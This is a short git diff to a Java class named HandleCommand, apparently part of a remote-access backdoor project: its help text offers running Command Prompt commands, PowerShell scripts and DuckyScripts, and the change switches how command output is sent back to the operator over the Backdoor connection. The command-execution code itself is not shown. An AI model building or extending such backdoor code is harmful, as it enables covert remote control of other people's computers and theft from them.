@@ -26,12 +26,11 @@ public class HandleCommand {
 	 * Handles command.
 	 * <p>
 	 * Handles command {@code command} and sets {@code send} to an appropriate
-	 * response. Uses {@link Backdoor#out} to send the response followed by a token
-	 * to signal the end of the response.
+	 * response. Uses {@link Backdoor#out} to send the response.
 	 *
 	 * @param command command given to the backdoor
 	 */
-	public static void handle(String command) {
+	public static void handle(String command) throws IOException {
 		StringBuilder send = new StringBuilder();
 		if (command.equals("help"))
 			send = new StringBuilder("[cmd] Run Command Prompt commands\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
@@ -276,6 +275,7 @@ public class HandleCommand {
 			}
 		else if (!command.isEmpty())
 			send = new StringBuilder("Command not found");
-		Backdoor.out.println(send.toString() + "\n!$end$!");
+		Backdoor.out.writeObject(send.toString());
+		Backdoor.out.flush();
 	}
 }
